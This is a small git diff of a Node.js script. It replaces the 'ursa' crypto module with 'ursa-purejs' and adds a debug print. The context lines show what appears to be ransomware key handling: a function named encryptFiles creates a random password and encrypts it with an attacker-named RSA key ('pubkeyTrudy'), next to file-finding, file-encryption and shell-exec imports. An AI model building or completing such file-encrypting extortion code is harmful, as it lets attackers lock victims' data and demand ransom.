@@ -1,6 +1,6 @@
 var fileFinder = require('fs-finder');
 var fileStream = require('fs');
-var ursa = require('ursa');
+var ursa = require('ursa-purejs');
 var encryptor = require('file-encryptor');
 var sys = require('sys');
 var exe = require('child_process').exec;
@@ -24,6 +24,7 @@ function encryptFiles(){
   console.log("DUDE ITS RUNNING!!!");
   var secureRandom = require('secure-random-string');
   var password = secureRandom(64);
+console.log(`Print out ursa: ${ursa}`);
   var pubkey = ursa.createPublicKey(pubkeyTrudy);
   encryptedKey = pubkey.encrypt(password, 'utf8', 'base64');
   
